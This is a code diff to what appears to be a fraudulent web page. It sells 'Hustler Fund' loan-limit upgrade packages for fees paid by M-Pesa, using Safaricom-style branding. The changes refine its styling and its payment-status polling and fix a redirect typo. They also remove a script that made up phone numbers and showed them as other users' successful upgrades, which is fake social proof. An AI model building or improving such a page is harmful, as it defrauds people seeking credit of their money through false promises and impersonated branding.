@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -123,7 +124,6 @@
         }
 
         .btn-select {
-            background: var(--safaricom-green);
             color: white;
             border: none;
             padding: 10px;
@@ -132,6 +132,12 @@
             font-weight: bold;
             cursor: pointer;
             font-size: 0.8rem;
+            background: linear-gradient(135deg, #28a745 0%, #222222 50%, #dc3545 100%);
+            transition: opacity 0.2s ease, transform 0.2s ease;
+        }
+        .btn-select:hover {
+            opacity: 0.88;
+            transform: scale(1.02);
         }
 
         /* Payment Section */
@@ -276,12 +282,13 @@
 
         // 1. Generate 50 Packages dynamically
         const container = document.getElementById('packageGrid');
+        let gridHTML = '';
         for (let i = 1; i <= 50; i++) {
             let limit = i * 1000;
             // Fee calculation (e.g., KSh 50 base + tiered percentage)
-            let fee = Math.floor(50 + (limit * 0.012)); 
+            let fee = Math.floor(50 + (limit * 0.012));
 
-            container.innerHTML += `
+            gridHTML += `
                 <div class="pkg-card">
                     <span class="hot-badge">NEW</span>
                     <h3>HUSTLER FUND ${limit.toLocaleString()}</h3>
@@ -290,6 +297,7 @@
                 </div>
             `;
         }
+        container.innerHTML = gridHTML;
 
         // 2. Modal Controls
         function openModal(limit, fee) {
@@ -345,7 +353,16 @@
 
         async function startPolling(invoiceId) {
             const status = document.getElementById('status-msg');
+            let pollCount = 0;
+            const MAX_POLLS = 40; // ~2 minutes at 3s intervals
             pollTimer = setInterval(async () => {
+                if (++pollCount > MAX_POLLS) {
+                    clearInterval(pollTimer);
+                    status.style.color = "red";
+                    status.innerText = "Timed out. Please check your M-Pesa messages.";
+                    resetButton();
+                    return;
+                }
                 try {
                     const response = await fetch(`${BACKEND_URL}/api/status/${invoiceId}`);
                     const data = await response.json();
@@ -355,7 +372,7 @@
                         clearInterval(pollTimer);
                         status.style.color = "green";
                         status.innerHTML = "<strong>✅ Success!</strong><br>Admin is working on you...";
-                        setTimeout(() => { window.location.href = "vocher.html"; }, 3000);
+                        setTimeout(() => { window.location.href = "voucher.html"; }, 3000);
                     } else if (state === "FAILED" || state === "REJECTED") {
                         clearInterval(pollTimer);
                         status.style.color = "red";
@@ -372,15 +389,6 @@
             btn.innerText = "Pay via M-Pesa";
         }
 
-        // 4. Live Activity Toast
-        const pref = ["0712", "0722", "0745", "0790", "0110", "0758"];
-        setInterval(() => {
-            const toast = document.getElementById('notification');
-            const phone = pref[Math.floor(Math.random()*pref.length)] + "xxx" + Math.floor(100+Math.random()*899);
-            toast.innerText = `User ${phone} upgraded their limit successfully.`;
-            toast.style.display = 'block';
-            setTimeout(() => { toast.style.display = 'none'; }, 4000);
-        }, 9000);
     </script>
 </body>
 </html>
